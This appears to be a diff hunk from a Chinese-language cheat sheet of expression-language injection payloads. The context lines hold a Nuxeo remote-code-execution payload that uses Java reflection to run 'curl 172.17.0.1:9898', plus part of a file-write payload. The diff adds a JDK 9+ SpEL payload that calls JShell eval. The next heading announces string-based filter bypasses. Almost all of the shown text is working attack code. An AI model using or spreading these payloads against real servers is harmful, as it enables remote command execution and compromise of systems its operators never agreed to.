@@ -83,7 +83,10 @@ T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("
 Nuxeo RCE
 ''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')
 
-    
+
+jdk9+
+
+T(jdk.jshell.JShell).Methods[6].invoke(null,'').eval('xxxx');
 ```
 
 字符串绕过
